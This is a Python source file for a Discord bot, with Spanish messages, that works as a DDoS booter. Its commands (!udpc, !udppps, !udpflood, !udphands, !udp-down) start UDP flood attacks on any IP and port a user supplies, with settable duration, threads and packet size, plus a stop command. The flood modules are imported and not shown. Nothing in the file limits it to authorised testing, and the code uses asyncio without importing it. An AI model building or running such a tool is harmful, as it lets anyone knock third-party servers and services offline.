import discord
from discord.ext import commands
import threading
import time
import os

from utils import check_cooldown
from udpc import UDPC
from udppps import UDPPPS
from udpflood import UDPFlood
from udphands import UDPHands
from udpdown import udp_down

TOKEN_FILE = "token.txt"
if os.path.isfile(TOKEN_FILE):
    with open(TOKEN_FILE, "r") as f:
        TOKEN = f.read().strip()
else:
    import getpass
    TOKEN = getpass.getpass("Introduce el token de tu bot de Discord: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(TOKEN.strip())

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

attack_in_progress = False
last_attack_time = 0
cooldown_seconds = 10
current_attack_stop_event = None

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

@bot.command(name='ayuda')
async def ayuda(ctx):
    help_text = (
        "💫 **Comandos disponibles** ⚡\n"
        "🔹 `!ayuda`\n"
        "🔹 `!methods`\n"
        "🔹 `!botstatus`\n"
        "🔹 `!stop`"
    )
    await ctx.send(content=help_text)

@bot.command(name='methods')
async def methods(ctx):
    methods_text = (
        "🚀 **Métodos disponibles** 🚀\n"
        "🟢 `!udpc <ip> <port> <time> <threads> <packetsize>`\n"
        "🟡 `!udppps <ip> <port> <time> <threads>`\n"
        "🔵 `!udpflood <ip> <port> <time> <threads>`\n"
        "🟠 `!udp-down <ip> <port> <time>`\n"
        "🟣 `!udphands <ip> <port> <time> <threads>`\n"
        "⛔ `!stop`"
    )
    await ctx.send(methods_text)

# UDPC
@bot.command(name='udpc')
async def udpc(ctx, ip: str, port: int, time_: int, threads: int, packetsize: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    ok, msg = check_cooldown(attack_in_progress, last_attack_time, cooldown_seconds)
    if not ok:
        await ctx.send(msg)
        return
    if packetsize < 32 or packetsize > 1400:
        await ctx.send("❌ El tamaño del paquete debe ser entre 32 y 1400 bytes")
        return
    if threads < 1 or threads > 32:
        await ctx.send("❌ Los threads deben ser entre 1 y 32")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(
        f"🔥 **UDPC Attack ejecutándose** 🔥\n"
        f"🌐 Ip: `{ip}`\n"
        f"📍 Port: `{port}`\n"
        f"⏰ Tiempo: `{time_}` seg\n"
        f"💥 Threads: `{threads}`\n"
        f"🧊 Tamaño de paquete: `{packetsize}` bytes"
    )
    try:
        udpc = UDPC(ip, port, threads, packetsize, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udpc.flood, time_)
        await ctx.send(f"✅ Ataque UDPC finalizado")
    except Exception as e:
        await ctx.send(f"❗ Error al ejecutar UDPC: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

# UDPPPS
@bot.command(name='udppps')
async def udppps(ctx, ip: str, port: int, time_: int, threads: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    ok, msg = check_cooldown(attack_in_progress, last_attack_time, cooldown_seconds)
    if not ok:
        await ctx.send(msg)
        return
    if threads < 1 or threads > 32:
        await ctx.send("❌ Los threads deben ser entre 1 y 32")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(
        f"💣 **UDPPPS Attack ejecutándose** 💣\n"
        f"🌐 Ip: `{ip}`\n"
        f"📍 Port: `{port}`\n"
        f"⏰ Tiempo: `{time_}` seg\n"
        f"💥 Threads: `{threads}`\n"
        f"🧊 Tamaño de paquete: `1024` bytes"
    )
    try:
        brute = UDPPPS(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, brute.flood, time_)
        await ctx.send(f"✅ Ataque UDPPPS finalizado")
    except Exception as e:
        await ctx.send(f"❗ Error al ejecutar UDPPPS: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

# UDPHANDS
@bot.command(name='udphands')
async def udphands(ctx, ip: str, port: int, time_: int, threads: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    ok, msg = check_cooldown(attack_in_progress, last_attack_time, cooldown_seconds)
    if not ok:
        await ctx.send(msg)
        return
    if threads < 1 or threads > 32:
        await ctx.send("❌ Los threads deben ser entre 1 y 32")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(
        f"🟣 **UDPHANDS Attack ejecutándose** 🟣\n"
        f"🌐 Ip: `{ip}`\n"
        f"📍 Port: `{port}`\n"
        f"⏰ Tiempo: `{time_}` seg\n"
        f"💥 Threads: `{threads}`\n"
        f"🧊 Tamaño de paquete: `1024` bytes"
    )
    try:
        handshaker = UDPHands(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, handshaker.flood, time_)
        await ctx.send(f"✅ Ataque UDPHANDS finalizado")
    except Exception as e:
        await ctx.send(f"❗ Error al ejecutar UDPHANDS: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

# UDPFLOOD
@bot.command(name='udpflood')
async def udpflood(ctx, ip: str, port: int, time_: int, threads: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    ok, msg = check_cooldown(attack_in_progress, last_attack_time, cooldown_seconds)
    if not ok:
        await ctx.send(msg)
        return
    if threads < 1 or threads > 32:
        await ctx.send("❌ Los threads deben ser entre 1 y 32")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(
        f"🔵 **UDPFLOOD Attack ejecutándose** 🔵\n"
        f"🌐 Ip: `{ip}`\n"
        f"📍 Port: `{port}`\n"
        f"⏰ Tiempo: `{time_}` seg\n"
        f"💥 Threads: `{threads}`\n"
        f"🧊 Tamaño de paquete: `1024` bytes"
    )
    try:
        udp_fld = UDPFlood(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udp_fld.flood, time_)
        await ctx.send(f"✅ Ataque UDPFLOOD finalizado")
    except Exception as e:
        await ctx.send(f"❗ Error al ejecutar UDPFLOOD: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

# UDP-DOWN
@bot.command(name='udp-down')
async def udp_down_cmd(ctx, ip: str, port: int, time_: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    ok, msg = check_cooldown(attack_in_progress, last_attack_time, cooldown_seconds)
    if not ok:
        await ctx.send(msg)
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(
        f"🟠 **UDP-DOWN Attack ejecutándose** 🟠\n"
        f"🌐 Ip: `{ip}`\n"
        f"📍 Port: `{port}`\n"
        f"⏰ Tiempo: `{time_}` seg"
    )
    try:
        loop = asyncio.get_running_loop()
        sent_packets = await loop.run_in_executor(None, udp_down, ip, port, time_, current_attack_stop_event)
        await ctx.send(f"✅ Ataque UDP-DOWN finalizado, paquetes enviados: {sent_packets}")
    except Exception as e:
        await ctx.send(f"❗ Error al ejecutar UDP-DOWN: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@bot.command(name='stop')
async def stop(ctx):
    global attack_in_progress, current_attack_stop_event
    if attack_in_progress and current_attack_stop_event:
        current_attack_stop_event.set()
        await ctx.send("✅🚀 Todos los ataques han sido detenidos")
    else:
        await ctx.send("⚠️ No hay ataques en curso para detener❌")

bot.run(TOKEN)
